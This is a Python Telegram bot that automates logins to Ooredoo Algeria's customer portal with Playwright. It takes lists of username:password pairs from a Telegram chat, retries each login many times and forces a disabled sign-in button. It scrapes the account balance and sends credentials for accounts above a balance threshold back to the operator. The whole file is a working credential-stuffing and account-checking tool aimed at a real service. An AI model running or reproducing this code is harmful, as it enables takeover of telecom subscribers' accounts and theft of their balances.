#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Ooredoo Railway Bot - 05 format only + screenshot
"""

import os
import re
import sys
import time
import asyncio
import logging
from pathlib import Path

from dotenv import load_dotenv
from playwright.async_api import async_playwright
from telegram import Update
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    filters, ContextTypes,
)
from telegram.request import HTTPXRequest

load_dotenv()

TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN", "")
TELEGRAM_CHAT_ID = int(os.getenv("TELEGRAM_CHAT_ID", "0"))
MIN_BALANCE = int(os.getenv("MIN_BALANCE", "100"))
HEADLESS = os.getenv("HEADLESS", "true").lower() == "true"
RETRY_DELAY = 5
MAX_RETRY = 999

SIGNIN_URL = "https://my.ooredoo.dz/sign-in"

logging.basicConfig(level=logging.INFO,
                    format="%(asctime)s [%(levelname)s] %(message)s")
log = logging.getLogger("ooredoo")

LOG_FILE = "/tmp/bot.log"
try:
    fh = logging.FileHandler(LOG_FILE, encoding="utf-8")
    fh.setFormatter(logging.Formatter("%(asctime)s [%(levelname)s] %(message)s"))
    logging.getLogger().addHandler(fh)
except Exception:
    pass


def log_to_file(msg, level="INFO"):
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] [{level}] {msg}\n")
    except Exception:
        pass


state = {"running": False, "stop": False, "stats": None}


class Stats:
    def __init__(self):
        self.total = 0
        self.done = 0
        self.success = 0
        self.hit = 0
        self.no_balance = 0
        self.invalid = 0
        self.retries = 0
        self.errors = 0
        self.start_time = time.time()
        self.hits = []

    def elapsed(self):
        s = int(time.time() - self.start_time)
        h, m, s = s // 3600, (s % 3600) // 60, s % 60
        if h:
            return f"{h}h {m}m {s}s"
        if m:
            return f"{m}m {s}s"
        return f"{s}s"

    def summary(self):
        return (
            f"📊 <b>ملخص</b>\n"
            f"━━━━━━━━━━━━━━━━━\n"
            f"المجموع: <b>{self.total}</b>\n"
            f"تم: <b>{self.done}</b>\n"
            f"✅ نجح: <b>{self.success}</b>\n"
            f"💰 مؤهل: <b>{self.hit}</b>\n"
            f"⚠️ بلا رصيد: <b>{self.no_balance}</b>\n"
            f"❌ invalid: <b>{self.invalid}</b>\n"
            f"🔄 إعادات: <b>{self.retries}</b>\n"
            f"🛑 أخطاء: <b>{self.errors}</b>\n"
            f"⏱️ المدة: <b>{self.elapsed()}</b>"
        )

    def hits_text(self):
        if not self.hits:
            return "ما كاينش حسابات مؤهلة."
        lines = ["💰 <b>الحسابات المؤهلة:</b>", "━━━━━━━━━━━━━━━━━"]
        for i, (u, p, b) in enumerate(self.hits, 1):
            lines.append(f"<b>{i}.</b> <code>{u}:{p}</code> → <b>{b}</b> دج")
        return "\n".join(lines)


def parse_accounts(text):
    out = []
    for line in text.split("\n"):
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        parts = re.split(r"[:\t;,]", line, maxsplit=1)
        if len(parts) < 2:
            continue
        user = parts[0].strip()
        pwd = parts[1].strip()
        if user and pwd:
            out.append((user, pwd))
    return out


def find_balance_in_text(text):
    if not text:
        return None
    pats = [
        r"(?:solde|balance|رصيد|الرصيد)\D{0,30}([\d]+[.,][\d]{1,2})",
        r"([\d]+[.,][\d]{1,2})\s*(?:DA|دج|DZD)",
    ]
    for p in pats:
        m = re.search(p, text, re.IGNORECASE)
        if m:
            try:
                return float(m.group(1).replace(",", "."))
            except Exception:
                continue
    return None


def is_invalid_creds(text):
    """أخطاء تعتبر "invalid" → نتخطاو الصيغة"""
    if not text:
        return False
    t = text.lower()
    return any(p in t for p in [
        "identifiants non valides",
        "identifiants incorrects",
        "invalid user credentials",
        "invalid credentials",
        "mot de passe incorrect",
        "utilisateur non trouvé",
        "email invalide",
        "email invalid",
        "invalid email",
        "numéro invalide",
        "invalid number",
    ])


async def wait_page_ready(page, timeout=30):
    start = time.time()
    while time.time() - start < timeout:
        try:
            has = await page.evaluate("""
                () => {
                    const u = document.querySelector("input[aria-label='Username']");
                    const p = document.querySelector("input[type='password']");
                    return !!(u && p);
                }
            """)
            if has:
                return True
        except Exception:
            pass
        await asyncio.sleep(0.3)
    return False


async def fill_username(page, username):
    log_to_file(f"fill_username: {username}")
    try:
        loc = page.locator("input[aria-label='Username']").first
        if await loc.count() == 0:
            loc = page.locator("input[type='text']").first
        if await loc.count() == 0:
            return False

        await loc.scroll_into_view_if_needed()
        await loc.click(timeout=5000)
        await page.wait_for_timeout(200)

        await page.keyboard.press("Control+A")
        await page.keyboard.press("Delete")
        await page.wait_for_timeout(100)

        await page.keyboard.type(username, delay=80)
        await page.wait_for_timeout(300)

        val = await loc.input_value()
        log_to_file(f"  after: '{val}'")
        if val == username:
            return True
    except Exception as e:
        log_to_file(f"  failed: {e}", "ERROR")
    return False


async def fill_password(page, password):
    try:
        loc = page.locator("input[type='password']").first
        if await loc.count() == 0:
            return False

        await loc.scroll_into_view_if_needed()
        await loc.click(timeout=5000)
        await page.wait_for_timeout(200)

        await page.keyboard.press("Control+A")
        await page.keyboard.press("Delete")
        await page.wait_for_timeout(100)

        await page.keyboard.type(password, delay=80)
        await page.wait_for_timeout(300)

        val = await loc.input_value()
        if val == password:
            return True
    except Exception as e:
        log_to_file(f"  pwd failed: {e}", "ERROR")
    return False


async def click_connexion(page):
    try:
        btn = page.get_by_role("button", name=re.compile("connexion", re.I))
        if await btn.count() > 0:
            el = btn.first
            for i in range(20):
                d = await el.get_attribute("disabled")
                if d is None:
                    break
                await asyncio.sleep(0.5)
            try:
                await el.click(timeout=5000)
                return True
            except Exception:
                await el.click(force=True)
                return True
    except Exception as e:
        log_to_file(f"  click failed: {e}", "ERROR")

    try:
        ok = await page.evaluate("""
            () => {
                const btns = [...document.querySelectorAll('button')];
                const t = btns.find(b => /connexion/i.test(b.textContent || ''));
                if (!t) return false;
                t.removeAttribute('disabled');
                t.disabled = false;
                t.classList.remove('v-btn--disabled');
                t.click();
                return true;
            }
        """)
        if ok:
            return True
    except Exception:
        pass
    return False


async def detect_red_error(page):
    try:
        err = await page.evaluate("""
            () => {
                const vmsgs = [...document.querySelectorAll(
                    '.v-messages__message, .v-input__details .v-messages'
                )];
                for (const m of vmsgs) {
                    const t = (m.textContent || '').trim();
                    if (t.length > 3 && t.length < 200) {
                        const st = getComputedStyle(m);
                        if (st.display !== 'none' && st.visibility !== 'hidden') {
                            return t;
                        }
                    }
                }
                const toasts = [...document.querySelectorAll(
                    '.Vue-Toastification__toast, .v-snackbar, .v-alert'
                )];
                for (const t of toasts) {
                    const txt = (t.textContent || '').trim();
                    if (txt.length > 3 && txt.length < 300) {
                        const st = getComputedStyle(t);
                        if (st.display !== 'none' && st.visibility !== 'hidden') {
                            return txt;
                        }
                    }
                }
                return null;
            }
        """)
        if err:
            return err.strip()
    except Exception:
        pass

    try:
        body = await page.inner_text("body")
    except Exception:
        body = ""

    pats = [
        r"(identifiants?\s+non\s+valides[^\n]{0,100})",
        r"(identifiants?\s+incorrect[s]?[^\n]{0,100})",
        r"(mot de passe\s+incorrect[^\n]{0,100})",
        r"(invalid user credentials[^\n]{0,100})",
        r"(email\s+invalide[^\n]{0,100})",
        r"(email\s+invalid[^\n]{0,100})",
        r"(عذرا[^\n]{0,120}معاودة[^\n]{0,120})",
        r"(يرجى معاودة[^\n]{0,120})",
    ]
    for p in pats:
        m = re.search(p, body, re.IGNORECASE)
        if m:
            return m.group(1).strip()
    return None


async def wait_for_result(page, timeout=45):
    start = time.time()
    last_url = page.url

    while time.time() - start < timeout:
        if page.url != last_url:
            log_to_file(f"URL: {last_url} -> {page.url}")
            if "/sign-in" not in page.url and "/login" not in page.url:
                return {"status": "success", "url": page.url}
            last_url = page.url

        err = await detect_red_error(page)
        if err:
            return {"status": "error", "error": err}

        if "/sign-in" not in page.url and "/login" not in page.url:
            try:
                if await page.locator("input[type=password]").count() == 0:
                    return {"status": "success", "url": page.url}
            except Exception:
                pass

        await asyncio.sleep(0.5)

    return {"status": "timeout"}


async def try_account(browser, user, pwd, bot, chat_id):
    """✅ يجرب الرقم كما هو (05xxxxxxxxx) فقط"""
    ctx = await browser.new_context(
        locale="fr-FR",
        viewport={"width": 412, "height": 915},
        user_agent=("Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 "
                    "(KHTML, like Gecko) Chrome/120.0 Mobile Safari/537.36"),
    )
    page = await ctx.new_page()

    try:
        await page.goto(SIGNIN_URL, wait_until="domcontentloaded", timeout=60000)

        if not await wait_page_ready(page, timeout=30):
            await ctx.close()
            return {"status": "retry", "msg": "page not ready"}

        await page.wait_for_timeout(500)

        # ✅ نجربو الرقم كما هو فقط
        variant = user
        log_to_file(f"Trying: {variant}")

        if state["stop"]:
            await ctx.close()
            return {"status": "retry", "msg": "stopped"}

        # نمسحو
        try:
            await page.evaluate("""
                () => {
                    document.querySelectorAll('input').forEach(inp => {
                        if (inp.type === 'text' || inp.type === 'password') {
                            inp.value = '';
                        }
                    });
                }
            """)
            await page.wait_for_timeout(300)
        except Exception:
            pass

        if not await fill_username(page, variant):
            log_to_file(f"FAIL username")
            await ctx.close()
            return {"status": "retry", "msg": "fill_username"}

        await page.wait_for_timeout(200)

        if not await fill_password(page, pwd):
            log_to_file(f"FAIL password")
            await ctx.close()
            return {"status": "retry", "msg": "fill_password"}

        await page.wait_for_timeout(500)

        # 📸 صورة قبل الضغط
        try:
            await page.screenshot(path=f"/tmp/before_{variant}.png", full_page=True)
            with open(f"/tmp/before_{variant}.png", "rb") as f:
                await bot.send_photo(
                    chat_id=chat_id, photo=f,
                    caption=f"📸 قبل الضغط: <code>{variant}</code>",
                    parse_mode="HTML",
                )
        except Exception as e:
            log_to_file(f"screenshot failed: {e}", "WARN")

        # نضغطو
        if not await click_connexion(page):
            log_to_file("FAIL click")
            await ctx.close()
            return {"status": "retry", "msg": "click"}

        result = await wait_for_result(page, timeout=30)
        log_to_file(f"Result: {result}")

        # 📸 صورة بعد الضغط
        try:
            await page.screenshot(path=f"/tmp/after_{variant}.png", full_page=False)
            with open(f"/tmp/after_{variant}.png", "rb") as f:
                await bot.send_photo(
                    chat_id=chat_id, photo=f,
                    caption=f"📸 بعد الضغط: <code>{variant}</code>",
                    parse_mode="HTML",
                )
        except Exception as e:
            log_to_file(f"after screenshot: {e}", "WARN")

        if result["status"] == "success":
            await page.wait_for_timeout(2000)
            body = await page.inner_text("body")
            bal = find_balance_in_text(body)
            await ctx.close()
            return {"status": "success", "balance": bal}

        if result["status"] == "error":
            err = result["error"]
            log_to_file(f"Error: {err}")
            await ctx.close()

            # إذا invalid / email invalide → نعاودو (نفس الصيغة أو نفس الحساب)
            if is_invalid_creds(err):
                return {"status": "invalid", "msg": err}

            # خطأ آخر → نتوقف
            return {"status": "error", "msg": err, "stop": True}

        # timeout → نعاودو
        await ctx.close()
        return {"status": "retry", "msg": "timeout"}

    except Exception as e:
        log_to_file(f"try_account exception: {e}", "ERROR")
        try:
            await ctx.close()
        except Exception:
            pass
        return {"status": "retry", "msg": str(e)}


async def run_check(app, chat_id, accounts):
    stats = Stats()
    stats.total = len(accounts)
    state["stats"] = stats
    bot = app.bot

    await bot.send_message(chat_id=chat_id,
        text=(f"🚀 <b>بداية</b>\nعدد: <b>{len(accounts)}</b>\n"
              f"الحد: <b>{MIN_BALANCE}</b> دج\n"
              f"🔄 يعاود للأبد حتى يدخل."),
        parse_mode="HTML")

    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=HEADLESS,
            args=["--no-sandbox", "--disable-dev-shm-usage", "--disable-gpu"])
        try:
            for idx, (user, pwd) in enumerate(accounts, 1):
                if state["stop"]:
                    await bot.send_message(chat_id=chat_id, text="⏹️ توقف.")
                    break

                await bot.send_message(chat_id=chat_id,
                    text=f"🔄 [{idx}/{len(accounts)}] نبداو <code>{user}</code>",
                    parse_mode="HTML")

                last_notify = time.time()
                attempts = 0

                while attempts < MAX_RETRY:
                    if state["stop"]:
                        break
                    attempts += 1

                    try:
                        r = await try_account(browser, user, pwd, bot, chat_id)
                    except Exception:
                        r = {"status": "retry", "msg": "exception"}

                    if r.get("stop"):
                        stats.errors += 1
                        await bot.send_message(chat_id=chat_id,
                            text=f"🛑 <b>توقف</b>\nالسبب: <code>{r.get('msg')}</code>",
                            parse_mode="HTML")
                        state["stop"] = True
                        break

                    if r["status"] == "success":
                        stats.success += 1
                        stats.done += 1
                        bal = r.get("balance")
                        if bal is None:
                            stats.no_balance += 1
                        elif bal >= MIN_BALANCE:
                            stats.hit += 1
                            stats.hits.append((user, pwd, bal))
                            await bot.send_message(chat_id=chat_id,
                                text=(f"💰 <b>مؤهل!</b>\n"
                                      f"👤 <code>{user}</code>\n"
                                      f"🔑 <code>{pwd}</code>\n"
                                      f"💵 <b>{bal}</b> دج"),
                                parse_mode="HTML")
                        else:
                            await bot.send_message(chat_id=chat_id,
                                text=f"✅ دخل {user} | رصيد: {bal} دج",
                                parse_mode="HTML")
                        break

                    stats.retries += 1
                    if r["status"] == "invalid":
                        stats.invalid += 1

                    # إشعار كل 60 ثانية
                    if time.time() - last_notify > 60:
                        await bot.send_message(chat_id=chat_id,
                            text=(f"🔄 {user}\n"
                                  f"محاولات: {attempts}\n"
                                  f"السبب: <code>{r.get('msg', 'invalid')}</code>"),
                            parse_mode="HTML")
                        last_notify = time.time()

                    await asyncio.sleep(RETRY_DELAY)

                if state["stop"]:
                    break

        finally:
            await browser.close()

    try:
        await bot.send_message(chat_id=chat_id, text=stats.summary(), parse_mode="HTML")
        if stats.hits:
            await bot.send_message(chat_id=chat_id, text=stats.hits_text(), parse_mode="HTML")
    except Exception:
        pass

    state["running"] = False
    state["stop"] = False


async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🚀 بوت Ooredoo\n\nابعتلي ملف accounts.txt\n"
        "🔄 يعاود للأبد\n\n"
        "/start /status /stop /log",
        parse_mode="HTML")


async def cmd_status(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if state["running"]:
        s = state["stats"]
        await update.message.reply_text(
            f"⏳ {s.done}/{s.total}\n"
            f"✅ {s.success} | 💰 {s.hit} | ❌ {s.invalid} | 🔄 {s.retries}",
            parse_mode="HTML")
    else:
        await update.message.reply_text("✅ جاهز.")


async def cmd_log(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    try:
        with open(LOG_FILE, "rb") as f:
            await update.message.reply_document(document=f, filename="bot.log",
                                                 caption="📋 Logs")
    except Exception as e:
        await update.message.reply_text(f"❌ {e}")


async def cmd_stop(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    state["stop"] = True
    await update.message.reply_text("⏹️")


async def handle_document(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.id != TELEGRAM_CHAT_ID:
        return
    if state["running"]:
        await update.message.reply_text("⚠️ فحص جاري.")
        return
    doc = update.message.document
    if not doc:
        return
    file = await ctx.bot.get_file(doc.file_id)
    data = await file.download_as_bytearray()
    text = data.decode("utf-8", errors="ignore")
    accounts = parse_accounts(text)
    if not accounts:
        await update.message.reply_text("❌ فارغ.")
        return
    state["running"] = True
    state["stop"] = False
    await update.message.reply_text(
        f"📄 {len(accounts)} حساب.\n🔄 نعاودو...",
        parse_mode="HTML")
    asyncio.create_task(run_check(ctx.application, update.effective_chat.id, accounts))


async def handle_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.id != TELEGRAM_CHAT_ID:
        return
    text = update.message.text.strip()
    if text.startswith("/"):
        return
    accounts = parse_accounts(text)
    if accounts:
        if state["running"]:
            await update.message.reply_text("⚠️ فحص جاري.")
            return
        state["running"] = True
        state["stop"] = False
        await update.message.reply_text(
            f"📄 {len(accounts)} حساب.", parse_mode="HTML")
        asyncio.create_task(run_check(ctx.application, update.effective_chat.id, accounts))
    else:
        await update.message.reply_text("💡 ابعتلي ملف.")


def main():
    print("🚀 Ooredoo Bot starting...")
    if not TELEGRAM_TOKEN or not TELEGRAM_CHAT_ID:
        raise Exception("TELEGRAM_TOKEN أو TELEGRAM_CHAT_ID ناقصين")

    request = HTTPXRequest(
        connection_pool_size=8,
        connect_timeout=30.0,
        read_timeout=30.0,
        write_timeout=30.0,
        pool_timeout=30.0,
    )
    app = (Application.builder()
           .token(TELEGRAM_TOKEN)
           .request(request)
           .get_updates_request(request)
           .build())

    async def on_error(update, context):
        log_to_file(f"Handler error: {context.error}", "ERROR")

    app.add_error_handler(on_error)
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("status", cmd_status))
    app.add_handler(CommandHandler("stop", cmd_stop))
    app.add_handler(CommandHandler("log", cmd_log))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))

    print("✅ Bot running")
    app.run_polling(allowed_updates=Update.ALL_TYPES,
                    poll_interval=2.0, timeout=30)


if __name__ == "__main__":
    main()
